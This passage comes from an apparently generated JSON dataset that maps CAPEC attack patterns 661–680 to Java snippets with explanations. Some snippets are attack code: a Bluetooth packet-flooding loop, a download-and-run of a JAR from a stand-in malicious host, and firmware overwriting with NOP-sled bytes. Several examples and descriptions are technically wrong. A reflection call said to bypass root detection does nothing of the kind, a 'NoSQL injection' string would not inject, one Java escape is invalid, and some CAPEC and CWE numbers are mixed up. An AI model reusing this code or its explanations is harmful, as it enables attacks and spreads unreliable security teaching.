Process process = Runtime.getRuntime().exec(\"su\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String output = in.readLine();\n            return output != null && !output.isEmpty();\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary evades Root/Jailbreak detection by downloading and executing arbitrary code from an untrusted source. The code highlights several vulnerabilities: CWE-494 (Download of Code Without Integrity Check) by fetching code from a remote URL without verifying its integrity, CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by simulating the execution of the downloaded code, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by bypassing root detection checks. Additionally, it includes a placeholder for an OS command injection vulnerability (CWE-78) in the root detection logic."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import java.lang.reflect.Method;\n\npublic class RootDetectionBypass {\n    public static void main(String[] args) {\n        try {\n            // Check if the device is rooted by looking for the 'su' binary\n            boolean isRooted = isDeviceRooted();\n            if (isRooted) {\n                System.out.println(\"Device is rooted.\");\n            } else {\n                System.out.println(\"Device is not rooted.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isDeviceRooted() throws Exception {\n        // Attempt to detect root by checking for the presence of 'su' binary\n        String[] paths = {\"/sbin/su\", \"/system/bin/su\", \"/system/xbin/su\", \"/data/local/xbin/su\", \"/data/local/bin/su\", \"/system/sd/xbin/su\", \"/system/bin/failsafe/su\", \"/data/local/su\"};\n        for (String path : paths) {\n            if (new java.io.File(path).exists()) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    // Method to bypass root detection using reflection to disable the check\n    private static void bypassRootDetection() throws Exception {\n        Class<?> cls = Class.forName(\"RootDetectionBypass\");\n        Method method = cls.getDeclaredMethod(\"isDeviceRooted\");\n        method.setAccessible(false); // Disable access to the root detection method\n    }\n}",
        "description": "This Java code snippet demonstrates a basic root detection mechanism and a method to bypass it using reflection. The `isDeviceRooted` method checks for the presence of the 'su' binary in common directories to determine if the device is rooted. The `bypassRootDetection` method uses reflection to disable access to the `isDeviceRooted` method, effectively bypassing the root detection. This embodies the CAPEC idea of evading root/jailbreak detection via debugging and modification of the application binary. The code also touches on related CWEs, such as active debug code (CWE-489) and exposure of sensitive system information (CWE-497), by demonstrating how an adversary might manipulate the application to bypass security checks."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableBrowser {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/malicious-script.js\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            InputStream in = conn.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n            StringBuilder script = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                script.append(line);\n            }\n            reader.close();\n            // Execute the downloaded script without integrity check\n            executeScript(script.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void executeScript(String script) {\n        // Simulate script execution\n        System.out.println(\"Executing script: \" + script);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable browser scenario where a script is downloaded and executed without verifying its integrity, embodying the CAPEC 'Adversary in the Browser (AiTB)'. The code fetches a script from a remote URL and executes it directly, which is a direct representation of CWE-494 (Download of Code Without Integrity Check). This lack of integrity check allows an adversary to manipulate the traffic and inject malicious code, representing the main idea of the CAPEC. Additionally, the code does not verify the identity of the actors involved in the communication, aligning with CWE-300 (Channel Accessible by Non-Endpoint)."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "public class TransientExecutionVulnerability {\n    private static final int SECRET_DATA = 0x12345678;\n    private static final int ARRAY_SIZE = 256;\n    private static final int[] cache = new int[ARRAY_SIZE];\n\n    public static void main(String[] args) {\n        int index = getUserInput();\n        transientExecution(index);\n    }\n\n    private static int getUserInput() {\n        // Simulate user input\n        return 0;\n    }\n\n    private static void transientExecution(int index) {\n        // Simulate speculative execution\n        if (index < ARRAY_SIZE) {\n            cache[index] = SECRET_DATA;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a transient execution vulnerability. The `transientExecution` method simulates speculative execution by conditionally accessing an array and assigning a secret value to it. If an attacker can manipulate the `index` value, they could potentially exploit this behavior to infer the value of `SECRET_DATA` through side-channel attacks, such as cache timing attacks. This example embodies the main idea of CAPEC-640 by showing how transient instruction execution can expose sensitive data. The related CWEs are represented by the speculative execution (`CWE-1420`), the potential for information exposure through microarchitectural state (`CWE-1342`), and the non-transparent sharing of microarchitectural resources (`CWE-1303`)."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class SSRFExample {\n    public static void main(String[] args) {\n        try {\n            // User input URL (potentially malicious)\n            String userInput = args[0];\n            URL url = new URL(userInput);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // Read response\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            // Print response\n            System.out.println(content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The code takes a URL as input from the user (via command line arguments), creates an HTTP connection to that URL, and prints the response. The vulnerability arises because the input URL is not validated, allowing an attacker to craft a malicious URL that could force the server to make requests to internal services or external sites with the server's privileges. This can lead to unauthorized access to sensitive data or other malicious actions. The code embodies CWE-918 (SSRF) and CWE-20 (Improper Input Validation) by not validating the user input URL, making it susceptible to exploitation."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class ThunderboltExploit {\n    private static final String FIRMWARE_PATH = \"/path/to/thunderbolt/firmware.bin\";\n    private static final String MALICIOUS_FIRMWARE = \"/path/to/malicious/firmware.bin\";\n\n    public static void main(String[] args) {\n        try {\n            // CWE-345: Insufficient Verification of Data Authenticity\n            byte[] firmwareData = Files.readAllBytes(Paths.get(FIRMWARE_PATH));\n            if (!verifyFirmware(firmwareData)) {\n                System.out.println(\"Firmware verification failed. Proceeding with exploit.\");\n\n                // CWE-353: Missing Support for Integrity Check\n                byte[] maliciousData = Files.readAllBytes(Paths.get(MALICIOUS_FIRMWARE));\n                Files.write(Paths.get(FIRMWARE_PATH), maliciousData);\n\n                // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n                if (authenticateBypass()) {\n                    System.out.println(\"Authentication bypassed. Exploit successful.\");\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean verifyFirmware(byte[] data) {\n        // Simulate a weak verification mechanism\n        return data.length > 0; // CWE-345: Insufficient Verification of Data Authenticity\n    }\n\n    private static boolean authenticateBypass() {\n        // Simulate an authentication bypass\n        return true; // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n    }\n}",
        "description": "This Java code snippet simulates an exploit of Thunderbolt protection flaws by leveraging several common weaknesses. The code reads the current firmware from a specified path and performs a weak verification check (CWE-345: Insufficient Verification of Data Authenticity). If the verification fails, it proceeds to overwrite the firmware with malicious data (CWE-353: Missing Support for Integrity Check). The code then simulates an authentication bypass (CWE-288: Authentication Bypass Using an Alternate Path or Channel) to complete the exploit. This snippet represents the main idea of exploiting Thunderbolt firmware vulnerabilities to manipulate the device's behavior."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import javax.bluetooth.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class BlueSmackingAttack {\n    public static void main(String[] args) throws IOException, BluetoothStateException {\n        LocalDevice localDevice = LocalDevice.getLocalDevice();\n        DiscoveryAgent agent = localDevice.getDiscoveryAgent();\n        Vector<RemoteDevice> devices = new Vector<>();\n\n        agent.startInquiry(DiscoveryAgent.GIAC, new DiscoveryListener() {\n            public void deviceDiscovered(RemoteDevice btDevice, DeviceClass cod) {\n                devices.add(btDevice);\n            }\n\n            public void inquiryCompleted(int discType) {\n                System.out.println(\"Inquiry completed.\");\n            }\n\n            public void servicesDiscovered(int transID, ServiceRecord[] servRecord) {}\n\n            public void serviceSearchCompleted(int transID, int respCode) {}\n        });\n\n        try {\n            Thread.sleep(10000); // Wait for device discovery\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n\n        for (RemoteDevice device : devices) {\n            try {\n                L2CAPConnection connection = (L2CAPConnection) Connector.open(\"btl2cap://\" + device.getBluetoothAddress() + \":1001\");\n                byte[] largePacket = new byte[65535]; // Large packet to flood\n                Arrays.fill(largePacket, (byte) 0xFF);\n                while (true) {\n                    connection.send(largePacket); // Flooding the device\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a BlueSmacking attack, where an adversary floods a Bluetooth-enabled device with large packets over the L2CAP protocol to create a Denial of Service (DoS). The code first discovers nearby Bluetooth devices and then attempts to establish an L2CAP connection to each discovered device. Once connected, it continuously sends large packets to the target device, overwhelming its resources. This code also highlights CWE-404 (Improper Resource Shutdown or Release) as it does not properly manage the connection resources, potentially leading to resource exhaustion. Additionally, it uses cleartext transmission (CWE-319) and does not ensure message integrity (CWE-924), making it vulnerable to other types of attacks."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "import javax.bluetooth.*;\nimport java.io.IOException;\n\npublic class BluetoothImpersonationAttack {\n    public static void main(String[] args) {\n        try {\n            // Simulate an adversary's device with a spoofed MAC address\n            String spoofedMAC = \"00:11:22:33:44:55\";\n            RemoteDevice remoteDevice = new RemoteDevice(spoofedMAC) {\n                public String getFriendlyName(boolean alwaysAsk) throws IOException {\n                    return \"TrustedDevice\";\n                }\n            };\n\n            // Attempt to authenticate with the spoofed MAC address\n            boolean isAuthenticated = authenticateDevice(remoteDevice);\n\n            if (isAuthenticated) {\n                System.out.println(\"Authentication successful. Malicious actions can be performed.\");\n                // Perform malicious actions here\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean authenticateDevice(RemoteDevice device) {\n        // Weak authentication mechanism\n        try {\n            String deviceName = device.getFriendlyName(false);\n            return \"TrustedDevice\".equals(deviceName);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by simulating an adversary's device with a spoofed MAC address. The adversary's device attempts to authenticate using a weak authentication mechanism that only checks the device's friendly name. If the authentication is successful, the adversary can perform malicious actions on the target Bluetooth device. This code embodies the main idea of CAPEC-290 (Authentication Bypass by Spoofing) and related CWEs such as CWE-940 (Improper Verification of Source of a Communication Channel) and CWE-1390 (Weak Authentication). The code highlights the vulnerability of using weak authentication mechanisms that can be easily spoofed by an attacker."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.Cipher;\nimport java.security.SecureRandom;\nimport java.util.Arrays;\n\npublic class BluetoothKeyNegotiation {\n    public static void main(String[] args) throws Exception {\n        // Simulate key negotiation with low entropy\n        int entropyBits = 1; // Vulnerable: Low entropy bits\n        SecureRandom secureRandom = new SecureRandom();\n        byte[] keyBytes = new byte[16];\n        secureRandom.nextBytes(keyBytes);\n        keyBytes = Arrays.copyOf(keyBytes, entropyBits); // Reduce entropy\n\n        // Generate key with low entropy\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(128, new SecureRandom(keyBytes));\n        SecretKey secretKey = keyGen.generateKey();\n\n        // Encrypt data\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedData = cipher.doFinal(\"Sensitive Data\".getBytes());\n\n        System.out.println(\"Encrypted Data: \" + Arrays.toString(encryptedData));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Bluetooth key negotiation process where the entropy bits are intentionally reduced, making it easier for an attacker to decrypt the communication. The code simulates the generation of a cryptographic key with low entropy, which is a critical flaw in the key negotiation process. This vulnerability aligns with the CAPEC description of the Key Negotiation of Bluetooth Attack (KNOB), where an adversary can exploit low entropy to decrypt information. The related CWEs provide additional context, such as the failure to use a strong protection mechanism (CWE-693) and the selection of a less-secure algorithm during negotiation (CWE-757)."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class SoftwareUpdate {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/update\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.bin\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n\n            in.close();\n            out.close();\n\n            // Simulate applying the update\n            applyUpdate(\"update.bin\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void applyUpdate(String filePath) {\n        // Insecurely applying the update without verification\n        System.out.println(\"Applying update from \" + filePath);\n        // Potentially malicious code execution\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism. The code downloads an update from a specified URL and saves it to a file named 'update.bin'. It then applies the update without any verification of its integrity or authenticity. This embodies the CAPEC 'Alteration of a Software Update' by showing how an adversary could insert malicious code into the update. The related CWEs are represented as follows: CWE-506 (Embedded Malicious Code) is implied by the lack of verification, CWE-807 (Reliance on Untrusted Inputs in a Security Decision) is shown by the untrusted update source, and CWE-1277 (Firmware Not Updateable) and CWE-1329 (Reliance on Component That is Not Updateable) are indirectly referenced by the lack of update verification and potential inability to patch the malicious update."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "public class MaliciousTool {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        if (isMaliciousCondition()) {\n            executeMaliciousPayload();\n        }\n\n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        // This security check might be optimized away by a maliciously altered compiler\n        if (!isSecure()) {\n            System.out.println(\"Security check failed\");\n        }\n\n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        String sensitiveData = \"Sensitive Information\";\n        if (isMaliciousCondition()) {\n            sensitiveData = \"Exposed Information\";\n        }\n        System.out.println(sensitiveData);\n    }\n\n    private static boolean isMaliciousCondition() {\n        // Simulate a condition that triggers malicious behavior\n        return true;\n    }\n\n    private static void executeMaliciousPayload() {\n        // Simulate malicious payload execution\n        System.out.println(\"Executing malicious payload...\");\n    }\n\n    private static boolean isSecure() {\n        // Simulate a security check\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Software Development Tools Maliciously Altered' (CAPEC) by embedding malicious behavior within a development tool. The code includes several CWE-related vulnerabilities:\n\n1. CWE-506: Embedded Malicious Code - The `executeMaliciousPayload` method simulates the execution of a malicious payload when a certain condition is met.\n2. CWE-733: Compiler Optimization Removal or Modification of Security-critical Code - The `isSecure` method represents a security check that could be optimized away by a maliciously altered compiler.\n3. CWE-913: Improper Control of Dynamically-Managed Code Resources - The `sensitiveData` variable is improperly controlled and can be altered based on a malicious condition, leading to the exposure of sensitive information.\n\nThe code illustrates how an adversary could embed malicious code and manipulate security-critical mechanisms within a development tool, leading to compromised software once deployed."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "public class ASICSecurity {\n    private String securityToken;\n    private String securityIdentifier;\n    private String confidentialInfo;\n\n    public ASICSecurity(String token, String identifier, String info) {\n        this.securityToken = token;\n        this.securityIdentifier = identifier;\n        this.confidentialInfo = info;\n    }\n\n    public void setSecurityToken(String token) {\n        // CWE-1270: Generation of Incorrect Security Tokens\n        if (token == null || token.isEmpty()) {\n            throw new IllegalArgumentException(\"Invalid security token\");\n        }\n        this.securityToken = token;\n    }\n\n    public void setSecurityIdentifier(String identifier) {\n        // CWE-1294: Insecure Security Identifier Mechanism\n        if (identifier == null || identifier.isEmpty()) {\n            throw new IllegalArgumentException(\"Invalid security identifier\");\n        }\n        this.securityIdentifier = identifier;\n    }\n\n    public String getConfidentialInfo() {\n        // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        return this.confidentialInfo;\n    }\n\n    public void restrictPhysicalAccess() {\n        // CWE-1263: Improper Physical Access Control\n        System.out.println(\"Physical access restricted to authorized personnel only.\");\n    }\n\n    public static void main(String[] args) {\n        // Example usage\n        ASICSecurity asic = new ASICSecurity(\"token123\", \"identifier123\", \"confidentialData\");\n        asic.setSecurityToken(\"newToken456\");\n        asic.setSecurityIdentifier(\"newIdentifier456\");\n        System.out.println(\"Confidential Info: \" + asic.getConfidentialInfo());\n        asic.restrictPhysicalAccess();\n    }\n}",
        "description": "This Java code snippet represents a simplified model of an ASIC (Application Specific Integrated Circuit) security mechanism. The class `ASICSecurity` encapsulates security tokens, security identifiers, and confidential information. The methods `setSecurityToken` and `setSecurityIdentifier` include basic validation to prevent the generation of incorrect security tokens (CWE-1270) and insecure security identifiers (CWE-1294). The method `getConfidentialInfo` demonstrates a potential vulnerability where confidential information could be accessed without adequate protection (CWE-1297). The `restrictPhysicalAccess` method is a placeholder to indicate the need for proper physical access control (CWE-1263). This code embodies the main idea of the CAPEC by showing how maliciously altered requirements could lead to vulnerabilities in the ASIC's security mechanisms."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "public class MaliciousChipProgramming {\n    private static final int SECRET_REGISTER = 0xDEADBEEF;\n    private static final int CONTROL_REGISTER = 0xCAFEBABE;\n    private static final int SECURITY_TOKEN = 0x12345678;\n\n    public static void main(String[] args) {\n        // Malicious code implanted during chip programming\n        if (checkSecurityToken(SECURITY_TOKEN)) {\n            // Improper access control to registers\n            int sensitiveData = readRegister(SECRET_REGISTER);\n            // Expose sensitive information\n            System.out.println(\"Sensitive Data: \" + sensitiveData);\n            // Replicating malicious code\n            replicateMaliciousCode();\n        }\n    }\n\n    private static boolean checkSecurityToken(int token) {\n        // Improper restriction of security token assignment\n        return token == SECURITY_TOKEN;\n    }\n\n    private static int readRegister(int register) {\n        // Simulate reading from a memory-mapped I/O register\n        return register;\n    }\n\n    private static void replicateMaliciousCode() {\n        // Simulate replicating malicious code\n        System.out.println(\"Replicating malicious code...\");\n    }\n}",
        "description": "This Java code snippet simulates a scenario where malicious code is implanted during the chip programming phase. The code demonstrates improper access control to memory-mapped I/O registers and improper restriction of security token assignment. The `checkSecurityToken` method simulates a security check that is easily bypassed, allowing unauthorized access to sensitive data stored in a register. The `readRegister` method simulates reading sensitive data from a register, and the `replicateMaliciousCode` method represents the replication of malicious code. This snippet embodies the main idea of the CAPEC by showing how an adversary can alter a chip's program logic to expose sensitive information and replicate malicious code."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousSoftware {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"malicious.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n\n            // Load the downloaded JAR file\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"malicious.jar\").toURI().toURL()});\n            Class<?> clazz = classLoader.loadClass(\"MaliciousPayload\");\n            Runnable payload = (Runnable) clazz.getDeclaredConstructor().newInstance();\n\n            // CWE-506: Embedded Malicious Code\n            payload.run();\n\n            // CWE-215: Insertion of Sensitive Information Into Debugging Code\n            System.out.println(\"Debug: Sensitive information: \" + System.getenv(\"SECRET_KEY\"));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass MaliciousPayload implements Runnable {\n    @Override\n    public void run() {\n        // CWE-507: Trojan Horse\n        System.out.println(\"Executing hidden malicious code...\");\n        // Malicious actions here\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a developer inadvertently signs and distributes malicious software. The code downloads a JAR file from a remote location without verifying its integrity (CWE-494). It then loads and executes a class from the downloaded JAR, which contains hidden malicious code (CWE-506 and CWE-507). Additionally, the code prints sensitive information for debugging purposes (CWE-215). This represents the CAPEC scenario where a developer unknowingly signs and distributes software that has been maliciously altered."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "public class FPGAMaliciousAlteration {\n    private static boolean securityCheckEnabled = true;\n\n    public static void main(String[] args) {\n        // Simulate FPGA configuration reload\n        reloadFPGAConfiguration();\n\n        // Perform security-critical operation\n        if (securityCheckEnabled) {\n            performSecurityCriticalOperation();\n        } else {\n            System.out.println(\"Security check bypassed!\");\n        }\n    }\n\n    private static void reloadFPGAConfiguration() {\n        // Maliciously alter the FPGA configuration\n        securityCheckEnabled = false; // CWE-506: Embedded Malicious Code\n    }\n\n    private static void performSecurityCriticalOperation() {\n        // Security-critical code that could be optimized away\n        if (securityCheckEnabled) { // CWE-733: Compiler Optimization Removal\n            System.out.println(\"Performing security-critical operation...\");\n        } else {\n            System.out.println(\"Security check failed!\");\n        }\n    }\n}",
        "description": "This Java code snippet simulates the malicious alteration of an FPGA configuration, embodying the main idea of the CAPEC. The `reloadFPGAConfiguration` method represents the adversary's action of reloading the FPGA configuration memory to introduce a malicious function. This method sets `securityCheckEnabled` to false, simulating the embedding of malicious code (CWE-506). The `performSecurityCriticalOperation` method contains a security-critical check that could be optimized away by the compiler (CWE-733). The main method demonstrates how the security check can be bypassed due to the malicious alteration, leading to potential security breaches."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class DecommissionedDeviceHandler {\n    public static void main(String[] args) {\n        String sensitiveData = \"Sensitive Information\";\n        File file = new File(\"decommissioned_device.txt\");\n        try {\n            // Writing sensitive data to file\n            FileWriter writer = new FileWriter(file);\n            writer.write(sensitiveData);\n            writer.close();\n\n            // Simulating decommissioning without proper scrubbing\n            decommissionDevice(file);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void decommissionDevice(File file) {\n        // Improper scrubbing of sensitive data\n        if (file.delete()) {\n            System.out.println(\"Device decommissioned, but data may still be recoverable.\");\n        } else {\n            System.out.println(\"Failed to decommission device.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability described in the CAPEC by simulating the decommissioning of a device without properly scrubbing sensitive data. The code writes sensitive information to a file and then attempts to decommission the device by deleting the file. However, simply deleting the file does not ensure that the data is unrecoverable, embodying CWE-1266 (Improper Scrubbing of Sensitive Data from Decommissioned Device) and CWE-1301 (Insufficient or Incomplete Data Removal within Hardware Component). The code highlights the risk of sensitive information being retrieved from decommissioned devices if proper data scrubbing techniques are not employed."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "import com.mongodb.MongoClient;\nimport com.mongodb.client.MongoCollection;\nimport com.mongodb.client.MongoDatabase;\nimport org.bson.Document;\n\npublic class NoSQLInjectionExample {\n    public static void main(String[] args) {\n        MongoClient mongoClient = new MongoClient(\"localhost\", 27017);\n        MongoDatabase database = mongoClient.getDatabase(\"testdb\");\n        MongoCollection<Document> collection = database.getCollection(\"users\");\n\n        // User input that is not properly sanitized\n        String userInput = \"admin' OR '1'='1\";\n\n        // Vulnerable query construction\n        Document query = new Document(\"username\", userInput);\n\n        // Executing the query\n        Document user = collection.find(query).first();\n\n        if (user != null) {\n            System.out.println(\"User found: \" + user.toJson());\n        } else {\n            System.out.println(\"User not found\");\n        }\n\n        mongoClient.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a NoSQL injection vulnerability in a MongoDB query. The code connects to a MongoDB database and constructs a query using user input without proper sanitization. The user input is directly embedded into the query, which can be exploited by an attacker to manipulate the query logic. In this example, the input 'admin' OR '1'='1' would cause the query to always return true, potentially allowing unauthorized access to user data. This snippet embodies the main idea of CAPEC-943, CAPEC-1286, and related CWEs by showing how improper neutralization and validation of user input can lead to security vulnerabilities."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class MaliciousFirmwareUpdater {\n    private static final String FIRMWARE_PATH = \"/path/to/firmware.bin\";\n    private static final String MALICIOUS_CODE = \"\\x90\\x90\\x90\\x90\"; // NOP sled for shellcode\n\n    public static void main(String[] args) {\n        try {\n            // Simulate firmware update process\n            updateFirmware(FIRMWARE_PATH, MALICIOUS_CODE.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void updateFirmware(String firmwarePath, byte[] maliciousCode) throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(firmwarePath, true)) {\n            // Append malicious code to the firmware\n            fos.write(maliciousCode);\n            System.out.println(\"Firmware updated with malicious code.\");\n        }\n    }\n}",
        "description": "This Java code snippet simulates a malicious firmware update process, embodying the concept of 'Server Motherboard Compromise' (CAPEC). The code appends malicious code to a firmware file, representing CWE-506 (Embedded Malicious Code). The malicious code is a simple NOP sled, which could be part of a larger payload. The code does not implement any access control mechanisms, reflecting CWE-1262 (Improper Access Control for Register Interface). Additionally, the code does not protect the firmware file from unauthorized modifications, illustrating CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). This snippet demonstrates how an adversary could compromise a server motherboard by inserting malicious software during a firmware update."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class BuildConfig {\n    private static final String CONFIG_PATH = \"/tmp/build_config.txt\";\n\n    public static void main(String[] args) {\n        try {\n            // CWE-426: Untrusted Search Path\n            String configData = new String(Files.readAllBytes(Paths.get(CONFIG_PATH)));\n            System.out.println(\"Config Data: \" + configData);\n\n            // CWE-497: Exposure of Sensitive System Information\n            System.out.println(\"System Property: \" + System.getProperty(\"user.home\"));\n\n            // CWE-377: Insecure Temporary File\n            File tempFile = File.createTempFile(\"tempConfig\", \".txt\");\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Temporary configuration data\");\n            writer.close();\n\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            throw new IOException(\"Error reading configuration from \" + CONFIG_PATH);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where the system build data can be maliciously altered, embodying the main idea of the CAPEC. The code reads configuration data from an untrusted path (CWE-426), exposes sensitive system information (CWE-497), creates an insecure temporary file (CWE-377), and generates an error message containing sensitive information (CWE-209). The code highlights how improper handling of configuration data and system information can lead to vulnerabilities during the system build process."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "public class MemoryProtectionExample {\n    private static final int PROTECTED_REGION_START = 0x1000;\n    private static final int PROTECTED_REGION_END = 0x2000;\n    private static final int UNPROTECTED_REGION_START = 0x2000;\n    private static final int UNPROTECTED_REGION_END = 0x3000;\n\n    private static byte[] memory = new byte[0x4000];\n\n    public static void main(String[] args) {\n        // Simulate writing to protected region\n        writeMemory(0x1500, (byte) 0xAA); // Should be protected but is not\n\n        // Simulate writing to unprotected region\n        writeMemory(0x2500, (byte) 0xBB); // Unprotected and writable\n\n        // Simulate reading from protected region\n        byte data = readMemory(0x1500); // Should be protected but is not\n        System.out.println(\"Data read from protected region: \" + data);\n    }\n\n    private static void writeMemory(int address, byte value) {\n        if (address >= PROTECTED_REGION_START && address < PROTECTED_REGION_END) {\n            System.out.println(\"Warning: Writing to protected memory region at address \" + address);\n        }\n        memory[address] = value;\n    }\n\n    private static byte readMemory(int address) {\n        if (address >= PROTECTED_REGION_START && address < PROTECTED_REGION_END) {\n            System.out.println(\"Warning: Reading from protected memory region at address \" + address);\n        }\n        return memory[address];\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where memory protection is improperly configured, allowing read and write operations to a protected memory region. The code defines protected and unprotected memory regions and simulates read and write operations. Despite the intention to protect a specific memory region, the code allows access to it, illustrating vulnerabilities such as insufficient granularity of address regions (CWE-1222), improper access control (CWE-1257), and overlap between protected and unprotected regions (CWE-1260). The warnings printed during read and write operations highlight the security issue but do not prevent the access, embodying the main idea of CAPEC-642."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
